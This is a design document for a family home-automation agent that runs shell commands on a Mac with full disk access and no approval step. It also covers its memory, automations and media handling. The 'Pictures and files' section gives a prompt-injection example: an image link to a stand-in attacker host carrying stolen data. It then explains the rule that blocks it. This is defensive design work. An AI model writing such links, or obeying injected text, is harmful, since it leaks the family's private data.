# btw-agent design

A small agent that runs on one Mac and does things on it for a family. One gateway process serves
a web UI. Family members share **profiles**. Each profile has its own conversations, workspace
folder, skills and memory. The agent has a single tool, `run_command`.

## Decisions

| Area               | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Execution          | Commands run as the gateway's macOS user with full access to the disk and no approval step. There is no sandbox. The profile folder is only the default working folder. A "smart mode" that auto-approves or rejects commands may come later.                                                                                                                                                                                                                              |
| Clients            | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration).                                                                                                                                                                                                                                                                                                                                               |
| Exposure           | Public through a tunnel on a VPS. Every route requires login. The sign-up endpoint is disabled: accounts are created only with the local CLI, and passwords must be long and strong.                                                                                                                                                                                                                                                                                       |
| Profiles           | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.btw-agent/trash/` instead of erasing it.                                                                                                                                                                                                                                                                                           |
| Conversations      | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                             |
| Sender identity    | Every human message is sent to the model as `Name: text`. Attached files come first, each as a line saying who attached it and where it was saved, followed by the picture or PDF itself when the model gets one. Display names are unique across the gateway.                                                                                                                                                                                                             |
| Attachments        | Any file, up to 100 MB and 10 per message, saved in the profile's `attachments` folder. The model gets pictures and PDFs through the provider's Files API, never as base64 unless an upload fails, and every other file as its path.                                                                                                                                                                                                                                       |
| Providers          | Anthropic only for now (API key). Model presets are global and managed by the admin with the CLI or the `/admin` page. A preset has a name (default `<model> (anthropic)`), a model, and an optional context-window override. One preset is the default (the oldest until an admin picks another): new chats start with it, and automations without a preset use it.                                                                                                       |
| Preset switching   | Not allowed. A conversation keeps its provider and model for its whole life.                                                                                                                                                                                                                                                                                                                                                                                               |
| Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once.                                                                                                                                                                                                                                                                                               |
| System prompt      | Built once when the conversation is created: instructions and the skills catalog. **It is never changed afterwards, and no update notices are added.** If skills change in another conversation, this conversation only sees it by running commands. Memory isn't in it, so every conversation of a profile starts with the same prompt until its skills change.                                                                                                           |
| Memory             | Short Markdown notes per profile, one per topic, that the agent reads and changes with `btw memory`, like any other command. The system prompt lists the notes by name only, so the agent reads the ones it needs. The family sees and edits them on the Memory page. See [Memory](#memory).                                                                                                                                                                               |
| Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the skills that ship with btw (`packages/core/skills`: `automations` and `view-images`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`. |
| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. The agent looks at pictures itself with `btw view`, which attaches them to that command's result. There is no tool for either.                                            |
| Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                                            |

## Files on disk

```
~/.btw-agent/                 (override with BTW_HOME)
  config.json                 auth secret, Anthropic key, extra env vars for commands (mode 600)
  btw.db                      SQLite: users, sessions, profiles, presets, conversations, messages,
                              media, uploads, provider files, triggers, trigger runs, notifications
  media/<sha256>              copies of the pictures and files shown in chats, and of attached
                              files not sent yet
  bin/btw                     shim so the agent can run `btw` from any command
  profiles/<slug>/            default working folder for commands in this profile
    memories/<topic>.md       long-term memory: one note per topic
    memories/.facts.json      when each fact in memory was first seen
    skills/<name>/SKILL.md
    attachments/              files people attached to messages
  trash/<slug>-<timestamp>/   deleted profiles
~/.agents/skills/<name>/SKILL.md   global skills, visible to every profile
```

The folder name is a slug that is fixed when the profile is created. Renaming a profile changes
only its display name, so the skill paths already in system prompts stay valid.

Every skill is on in every profile until someone turns it off, on the profile's Skills page or with
`btw skill disable`. The profile stores the names it turned off (`profile.disabled_skills`), so skills
added later start out on. Skills that are off are left out of the catalog when a conversation is
created; conversations already running keep the catalog they started with.

## Prompt caching

The rule: **the request prefix must stay byte-identical, so history is only ever appended to.**

- Order of the request: `tools` (just `run_command`, a constant) → `system` (the conversation's saved
  copy) → `messages`. Editing the tool definition therefore costs every conversation one cache
  miss after the upgrade (adding `summary` and `icon` did).
- Each assistant response is stored as the exact `content` JSON the API returned, thinking blocks and
  their signatures included, and is sent back unchanged. Messages are never rebuilt from normalized
  columns. Command output is truncated once, when the tool result is created, and never later.
- Cache markers: `cache_control: {type: "ephemeral", ttl: "1h"}` on the system block, plus the same
  setting at the top level of the request (automatic caching of the growing tail). Both use 1h,
  because the API requires longer-TTL entries to come before shorter ones.
- The model, tool definition and system prompt are fixed per conversation. Thinking uses
  `adaptive` with `display: "summarized"`, the same for every conversation. The only per-conversation
  knob is `effort`.
- Steering messages, stop results and restart-recovery results are **appended** as new rows. Nothing
  is ever edited or deleted. Opus 5.5 and Fable 5.1 require this anyway for "preserved thinking":
  replaying a thinking block after its prefix changed returns a 400 on newer accounts.
- Every assistant row stores `usage`, and the gateway logs `cache_read` / `cache_write` and the hit
  rate for every call. The chat header shows the hit rate (tooltip: last reply and whole conversation),
  and a reply is marked as a cache miss when it read less than the previous call read or wrote, with
  the likely cause: over an hour idle (the TTL) or a changed request such as a new reasoning level.

## Agent loop

This is a hand-written loop over `client.messages.stream()` rather than the SDK's Tool Runner, because
each step must be saved to SQLite and resumed from there, including after a gateway restart.

```
kick(conversation):                     one loop per conversation at a time
  loop:
    commit queued human messages        (assigns seq; this is how steering happens)
    if the last committed row isn't a user row: stop
    stream a model call → append an assistant row
    if it contains tool_use blocks:
      run them one after another (run_command, or a memory operation) → append one user row with
      every tool_result
      (if stop_reason isn't tool_use, the calls are answered with "not run" instead)
```

- **Stop** aborts the stream (the partial reply is dropped, nothing is appended) or kills the running
  command's process group. Unfinished calls are answered with `Stopped by <name>.` Queued messages
  are committed without calling the model, and the next message continues the conversation.
- **API errors** leave the transcript ending on a user row. The UI then shows a **Continue** button,
  which calls `kick` again.
- **Gateway restart:** an assistant `tool_use` with no result gets an appended "interrupted" result,
  and conversations with queued messages are started again.
- Several consecutive user rows (for example tool results followed by steering texts) are sent as
  separate messages. The API merges them into one turn.

### `run_command`

- Input: `{summary, icon, command, cwd?, timeout_seconds?}`. Runs as `$SHELL -lc <command>`, so every
  call starts a fresh login shell and `cd` doesn't carry over between calls.
- `summary` (what the command does, in plain words and the conversation's language) and `icon` (a
  Lucide icon name) are only for the web UI, which shows them instead of the command. They come
  first in the schema so they stream in before the command. Required in the schema so the model
  always writes them, but a call without them still runs.
- Default timeout 120 s, maximum 1800 s. On timeout or Stop, the whole process group is killed.
  Background processes that a command detaches keep running.
- No stdin. `TERM=dumb`, `NO_COLOR=1`, `PAGER=cat`.
- Output is stdout and stderr interleaved, with ANSI codes removed, capped at 30 KB (the first 10 KB and
  the last 20 KB are kept), followed by an exit-code line. Images the command showed with `btw view`
  follow as image blocks (below).
- The environment is the gateway's own, minus its secrets (`ANTHROPIC_API_KEY`, `BETTER_AUTH_SECRET`, …),
  plus the `commandEnv` values from `config.json` (for example `FIRECRAWL_API_KEY`), plus
  `BTW_PROFILE`, `BTW_PROFILE_DIR`, `BTW_CONVERSATION_ID` and `BTW_VIEW_DIR`.
- `eager_input_streaming` is left off: the input is one short command, and leaving it off keeps the API's
  own input validation.

### Seeing images: `btw view`

The agent looks at an image by running `btw view <file>...`. There is no second tool: the images are
attached to that `run_command` call's `tool_result`, which may hold image blocks, so the tool
definition and every conversation's cache stay as they are. Like automations, nothing is added to
the system prompt beyond the skills catalog: the built-in `view-images` skill explains `btw view`,
and how to see what isn't a picture file yet (the screen, PDF pages, video frames, web pages),
crops for small print and contact sheets for many photos. A profile that turns the skill off
doesn't learn about `btw view`. Showing pictures to people is the other direction, in
[Pictures and files](#pictures-and-files).

- **Handoff.** Every call gets a fresh temp folder (`BTW_VIEW_DIR`) holding the conversation's
  remaining image allowance. `btw view` prepares each image, writes it there and adds a line to a
  manifest. After the command exits the gateway checks the files again, attaches them after the text
  output (each after an `Image: <path>` line), and deletes the folder. Not markers in stdout: output is
  cut at 30 KB, and `cat`-ing a file that contains one would attach an image nobody asked for.
- **Preparing** (`packages/core/src/images.ts`). JPEG, PNG, GIF and WebP up to 2000 px and 1.5 MB are
  sent as they are; JPEGs lose their EXIF and XMP segments (GPS positions, and an orientation that
  browsers apply but the model ignores). Everything else is converted with `sips` on macOS or
  ImageMagick elsewhere: at most 2000 px, turned upright, PNG when the source was PNG, GIF or WebP
  unless that's over 1.5 MB, otherwise JPEG. PDFs are refused.
- **Why 2000 px**, although newer models take 2576: a request with more than 20 images, the history
  included, rejects any image over 2000 px. History is never edited, so a larger image would break
  the conversation for good once it holds 21.
- **Limits.** 10 images per command, and 100 per conversation counting attached pictures (the API's
  limit on 200k-context models, and every request carries the whole history). Past a limit
  `btw view` fails with an explanation; nothing is dropped silently.
- **Uploaded, not inline.** The gateway uploads each image through the Files API (see
  [Attachments](#attachments)) and the `tool_results` row refers to it by `file_id`, so the history
  doesn't resend the bytes. Only if the upload fails does the image go inline as base64, and the
  conversation's inline images are capped at 20 MB, since a request is capped at 32 MB.

## Attachments

People attach files in the composer: the paperclip button, pasting, or dropping them on it. Any
kind of file, up to 100 MB each (the same as pictures in replies) and 10 per message.

- **Uploaded when attached.** Each file streams to `POST /api/p/<profile>/uploads` as soon as it's
  added, into the media store, with an `upload` row. Sending the message then carries only the
  upload ids, and only the person who attached a file can send it. Uploads never sent are dropped
  after a day. `btw start` raises adapter-node's 512 KB body limit for this; `hooks.server.ts`
  keeps a 1 MB limit on every other route, including the public ones that read a body first.
- **Saved for the agent.** On send, each file is copied into `profiles/<slug>/attachments/` under
  its own name (`name (2).ext` when another file has it), gets a media row so the chat shows it (see [Pictures and files](#pictures-and-files)), and the message's content gets, per file, a line saying who
  attached it and where it was saved, then the file itself when the model can have it:
  - **pictures** go through `prepareImage` (converted, at most 2000 px, upright) and become an
    `image` block with a `file_id`;
  - **PDFs** become a `document` block with a `file_id`, after a free `count_tokens` call that
    checks the model can read it and says what it costs;
  - **other files**, text included, are only named, and the agent opens them with commands.
- **Limits, because history is never edited.** A file the API refuses would fail every later
  request, so pictures count against the 100 per conversation, and a conversation's PDFs share
  25% of the model's context window (about 250k tokens on 1M-context models, 50k on 200k ones;
  well under the API's 600 and 100 pages). A PDF over the rest of that budget, or one
  `count_tokens` rejects, is sent as its path with the reason in its line, and the chat shows the
  same note under the file.
- **Files API.** Uploaded once per content and account: `provider_file` maps provider, a hash of
  the API key (files live in its workspace) and the content's SHA-256 to the `file_id`. Requests
  stay small whatever the history holds, and a reference is part of the cached prefix like any
  other block. A cached id is checked (one metadata request) before it's reused, and the file
  uploaded again if it's gone, since a message referring to a missing file would fail every later
  request. The hourly prune deletes files no message refers to any more, leaving those used in
  the last hour and those in another key's workspace alone. The Files API isn't eligible for zero
  data retention, and a conversation whose files are gone (another workspace's key, deleted in the
  Console) can't recover, since its history can't be rewritten.
- **Other providers.** `message.attachments` is the provider-neutral record (saved path, type,
  what the model got), while `content` holds the provider's own blocks, like the rest of the
  history. A provider brings a `FileStore` (`provider-files.ts`) and its own branch in
  `prepareMessage`; one without a files API would send pictures inline.

## Memory

Each profile's memory is a folder of short Markdown notes, `~/.btw-agent/profiles/<slug>/memories`,
one per topic (`family.md`, `people/anna.md`). There is no memory tool: like automations and
`btw view`, it is files plus a CLI command, so it works the same with any model provider.

- **In the prompt:** a short Memory section that names the notes as they were when the
  conversation started (`Notes when this conversation started: family, food, people/anna.`), says
  how to read and save them, and what is worth saving. Only names, never facts, so the prompt
  changes when a note is added or removed and not with every fact, and nothing is read until the
  agent needs it: before answering, it reads the notes that could matter
  (`btw memory show family food`).
- **`btw memory`** (`packages/cli/src/memory.ts`, on top of `packages/core/src/memory.ts`): `list`,
  `show <topic>...`, `add <topic> <fact>` (one bullet; creates the note, skips a fact it already
  has), `replace <topic> <old> <new>` (text that appears exactly once), `forget <topic> <text>` (the
  one line containing it), `write <topic>` (the whole note, from stdin), `rm` and `mv`. Topics are
  paths inside the folder; `..`, names starting with a dot and symbolic links are refused. Notes are
  written atomically and hold at most 50,000 characters. The agent can also edit the files
  directly; `btw memory` is preferred because it dates each fact.
- **What goes in:** one fact per bullet, updated rather than repeated. Secrets such as passwords
  and door codes are allowed when someone asks: a profile is only shared by people who trust each
  other, and models tend to refuse them in memory unless told so. The exception is something one
  member wants kept from the others (a surprise), since every member can read the memory.
- **Older conversations** keep their frozen prompt, which has the old `MEMORY.md` pasted in.
  Whenever a `MEMORY.md` shows up in the profile folder (the old file on the first use, or one an
  older chat writes later), it is moved into the folder as `general.md` (or `general-2.md`, …).
- **Fact dates.** Every list item, paragraph or table row in a note is a fact, and a hidden
  `.facts.json` in the folder records when each was first seen (matched by its words, ignoring
  case and spacing). `btw memory` and the page update it with each change; facts that reached the
  files some other way are dated by their file's modification time, and whatever was in memory
  before dates were kept has none. A fact that moves to another file, or leaves one and comes
  back, keeps its date. Names starting with a dot are reserved, so `btw memory` can't touch it.
- **Memory page** (`/p/<slug>/memory`): a grid of dots, one row per note and one dot per fact,
  oldest on the left. A dot's shade is its age: black today (with a halo), fading to light grey
  over about three months, and lightest when undated. Rows are ordered by the latest change, notes
  in a folder are grouped under its name, and past 12 rows the rest fold away. Pointing at (or
  tapping) a dot shows the fact and when it was learned. Below the grid, every note is rendered as
  Markdown and can be edited or forgotten. An edit is refused if the agent changed the note after
  it was opened; saving again then replaces the agent's version.

## Automations

Triggers run the agent without anyone sending a message. What they find goes to notifications, not
into conversations.

- **Trigger** (per profile). _When_: a 5-field cron expression in the gateway's local time zone, a
  one-time `runAt`, or a webhook: `POST /api/hooks/<secret token>` with a JSON body (64 KB max;
  SvelteKit's cross-site check refuses form-encoded and text/plain bodies in production). _What_:
  a prompt for the agent, or a shell command that runs without the model. Script triggers make
  polling cheap: the script checks the email, the price or the page, and runs
  `btw wake "<what happened>"` only when the agent is needed.
- **Who sets them up:** the agent, with the `btw trigger` command. There is no new tool and nothing
  in the system prompt beyond the skills catalog: the built-in `automations` skill explains
  `btw trigger` and `btw wake`, and is read only when someone asks for a reminder or a check. Members
  see, edit, run, pause and delete them on the profile's Automations page. There is no create form.
- **The Automations page** is for the family, not the agent. Each trigger shows its `icon` and a
  one-sentence `summary` (written by the agent with `--summary` / `--icon`, like `run_command`'s),
  its schedule in plain words (`describeCron`: "Every weekday at 07:30"; the cron itself only with
  technical details on) and relative times ("next Monday at 07:30"). The prompt, script and webhook
  URL are behind Edit. Above the list, a month calendar (whole weeks, Monday first, `?month=`
  to page) shows an icon per trigger on each day and the chosen day's list below it: before now,
  what ran and how it went (agent runs, and failed scripts once a day; runs are kept 30 days, so
  it goes back no further), after now, what the schedule will run. A trigger firing more than 4
  times a day on average is listed once above the grid instead.
- **Runs.** Every firing (schedule, webhook, `btw wake`, Run now) inserts a `pending` row in
  `trigger_run`. The gateway's scheduler ticks every 5 s: it fires triggers whose `nextRunAt` has
  passed and starts pending runs. The CLI only writes rows, so `btw wake` from a script is picked up
  within a tick. At most 3 agent runs go at once, a script trigger runs one at a time, and a
  scheduled firing is skipped while the trigger's previous run of the same kind is unfinished.
- **Missed firings** (Mac asleep, gateway down) collapse into one catch-up run, because the next time
  is computed from when the trigger actually fired.
- **Agent runs** happen in a hidden conversation (`conversation.hidden`) through the normal runner.
  Its first row has kind `trigger`: the model sees `[Automation "<name>" · <why> · <time>]`, the
  prompt, the webhook body, and instructions to keep the final reply short or answer only
  `NO_NOTIFICATION`. The system prompt is the ordinary one, so runs share the profile's cached prefix.
- **Finishing.** When a run's loop ends (`onLoopEnd`): an API error becomes an error notification, a
  final reply becomes a notification with that text, `NO_NOTIFICATION` on the last line (or no text)
  is recorded as `silent`, and a run someone stopped is `stopped`. None of these notify twice.
- **Script runs** execute like `run_command` (login shell, profile folder, the same environment plus
  `BTW_TRIGGER_ID` and `BTW_PAYLOAD`) with a 10-minute timeout, keeping the last 4 KB of output. A
  failing script notifies once, when it starts failing, not on every run.
- **Notifications** belong to the profile, like conversations. Dismissing is per person
  (`notification_dismissal`), and unread means newer than when that person last opened the menu
  (`notification_seen`). The bell listens on `/api/notifications/events` (SSE) and reloads on change.
- **Continue in chat** unhides the run's conversation, which moves into the sidebar with its whole
  transcript; sending a message into a hidden run does the same. A notification without a
  conversation (script failures, or the run was deleted) starts a new conversation whose first
  reply is the notification text.
- **After a restart**, agent runs that were in progress continue (the interrupted command gets the
  usual "restarted" result) and script runs in progress are marked failed.
- **Retention:** finished runs, notifications and hidden conversations are deleted after 30 days, and
  only the last 100 runs of each trigger are kept.

## Pictures and files

The agent shows a picture by writing a Markdown image, `![what it shows](path)`, and hands over a
file by linking it, `[Tax form](path)`. The system prompt explains this (so only conversations
created since know it). There is no new tool and the reply's `content` is never touched, so the
cached prefix doesn't change.

- **What counts** (`@btw/core/media-refs`): images whose target is a path on the computer (absolute,
  `~/…`, relative to the profile folder, or `file://`) or an http(s) URL, and links whose target is
  a path. Links to web pages stay links. It reads the text with marked's lexer, so code spans and
  code blocks are skipped, and the browser renders with the same file, so both agree.
- **Copied when the reply is saved.** After a model call, before appending its row, the runner copies
  every target into `~/.btw-agent/media/<sha256>` in its original size and bytes (remote pictures are
  downloaded, with a 30 s timeout), then appends the row and one `media` row per target in the same
  transaction. The chat keeps showing a picture after the original is moved, edited or was a
  temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
  on screen meanwhile; Stop aborts the copying.
- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
  picture is downloaded only if its exact link appears earlier in the conversation, in what a
  person wrote, an automation's prompt or event, or a command's output: the agent found the link
  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
  "Web pictures are shown only when btw found the link on a page or in a message", and the system
  prompt tells the agent to download other pictures and show the file. This narrows the channel
  rather than closing it: a reply can still choose which of the links it found to show, and a
  command can print any link, but an agent that runs commands can already send anything with
  `curl`.
- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
  address checked is the one connected to (a name can't resolve to a public address for the check
  and a local one for the connection). IP addresses in a link are checked before connecting, and
  each redirect (up to 5) goes through the same checks.
- **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
  target that can't be copied gets a row with the reason in plain words (not found, a folder, too
  large, not a picture, a web link the agent didn't find, a local-network address, the download
  failed), which the chat shows in its place.
- **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
  (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
  download is still the original. Elsewhere they are shown as downloads. Width and height (with
  EXIF rotation applied) are read from the file header, so the chat reserves the space before a
  picture loads and stays scrolled to the bottom.
- **Serving:** `GET /api/c/<conversation>/media/<id>` checks that the user belongs to the
  conversation's profile and serves the copy by its random id; it never takes a path. Pictures are
  sent inline and everything else as an attachment; `?download` sends the original. Responses
  carry `nosniff`, a sandboxing CSP (an SVG opened in its own tab can't run script) and an
  immutable cache header.
- **The chat only loads btw's copies.** The Markdown renderer swaps each target for its copy: a
  picture (click to open a viewer with a Download button), a download card for files and for
  pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
  DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
  images, so the browser never loads anything a reply names from another site without a click. The
  gateway's own downloads are what the two rules above guard.
- **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
  files that no row points to any more and that are over an hour old (so a copy about to be saved
  is safe). Identical files are stored once.
- The notification menu shows pictures as `[their description]` and file links as their label.

## Web UI

It follows the ChatGPT app: a sidebar with chats, a centered column of messages, and a rounded
composer. Most of the family doesn't read shell, so the default view hides the machinery.

- **Components** are [shadcn-svelte](https://shadcn-svelte.com) (Luma style, neutral base) in
  `src/lib/components/ui`, generated by its CLI and owned by the repo; `components.json` records the
  settings. Colors are CSS variables in `src/routes/layout.css`, with a dark theme
  (`mode-watcher`: system, light or dark).
- **Replies** are built by `buildTranscript` (`src/lib/transcript.ts`): text blocks are shown as
  Markdown (`marked` + DOMPurify), and every run of thinking and commands between two texts is one
  collapsible group, "Worked for 12s" when done and a live "Thinking" / current step while running.
  Durations come from row timestamps, so they're approximate.
- **Steps** show the `summary` and `icon` the model wrote with each `run_command` call ("Checking
  tomorrow's weather in Berlin" with `cloud-sun-rain`), in the conversation's language. Opening a
  step shows the command and its output. Calls from before summaries existed say "Ran a command".
  Any Lucide icon works: `/api/icons/<name>` serves one icon's drawing from the `lucide` package, so
  pages don't download all two thousand; unknown names fall back to a terminal icon.
- **Technical details** (Settings, per device, in the `btw-prefs` cookie so the server renders it
  too) switch the labels to the raw commands and add context size, prompt-cache hit rate, cache
  misses, per-reply token usage and the model name. "Always show steps" opens the groups by default.
- **New chat** is the empty composer: the first message creates the conversation and is sent in
  the same request. Model and reasoning are picked from the chip in the composer: the model starts
  at the default preset, reasoning at the level last used on this device. In an existing chat only
  reasoning can change.
- `/` redirects to the last profile opened (`btw-profile` cookie) or the only one, else to
  `/profiles`.

## Code layout

```
packages/core   @btw/core. Schema + migrations, config, skills, prompt, run_command, memory notes,
                btw view images, attachments, Anthropic call and Files API, provider file cache,
                runner, media, users/profiles/presets, triggers, scheduler, notifications. Built-in
                skills in packages/core/skills. Plain TypeScript run by Node with type stripping (no
                enums or parameter properties; imports use .ts extensions).
packages/cli    btw: setup, start, service, config, key, env, user, preset, profile, skill, trigger, wake,
                view, memory
src/            SvelteKit gateway (adapter-node). @btw/core is bundled into the server build.
                UI components in src/lib/components (shadcn-svelte primitives in ui/).
scripts/        build-cli.mjs bundles the CLI and core into dist/cli.js with esbuild.
```

Core finds the package root by walking up to the `package.json` named `btw-agent`. That works
from source, from the SvelteKit build and from the bundled CLI, and gives the paths to the
migrations, `build/index.js` and the CLI entry.

## Distribution

Published to npm as `btw-agent` (not yet). `npm install -g btw-agent` gives the `btw` command.

- The package ships `build/` (the web app), `dist/cli.js`, `packages/core/drizzle` and the built-in
  skills in `packages/core/skills`. Its only
  runtime dependency is `better-sqlite3` (a native module with prebuilt binaries). Everything else is
  bundled. Node won't strip types inside `node_modules`, which is why the CLI ships as JavaScript.
- `btw setup` is the first-run wizard: config, API key, admin account, default preset, public URL.
- `btw start` reads host, port and origin from `config.json` (default `127.0.0.1:5780`), sets
  `HOST` / `PORT` / `ORIGIN` for adapter-node and imports `build/index.js`.
- `btw service install` writes a LaunchAgent (`~/Library/LaunchAgents/dev.btw-agent.gateway.plist`)
  that runs `node dist/cli.js start` with `KeepAlive` and logs to `~/.btw-agent/logs/gateway.log`.
  It's a LaunchAgent, not a LaunchDaemon, so commands run as the user. It records the absolute
  node path, so switching Node versions needs a reinstall.
- On shutdown, the gateway kills the process groups of commands that are still running.
- Remote access is the user's tunnel (Tailscale Funnel, Cloudflare Tunnel, a VPS). The gateway only
  binds to localhost by default.
- macOS privacy (TCC): the background `node` process needs Full Disk Access to reach Documents,
  Desktop, Photos and Mail. Setup prints the path. Granting it applies to everything that node
  binary runs.

## Not done yet

- **Compaction.** The context window is already stored on each conversation and shown in the UI.
  The next step is server-side compaction (beta `compact-2026-01-12`), triggered at about 85% of the
  window.
- Other providers (OpenRouter, ChatGPT). Each will get its own adapter and keep history in its own format.
- Smart approval mode.
- Refusal fallbacks (`fallbacks: "default"`) for models that support them. Refusals are shown in the UI today.
- Push notifications (Web Push) for the bell. Today it only updates while a page is open.
- A `btw notify` command for scripts that only need to say something, without waking the agent.
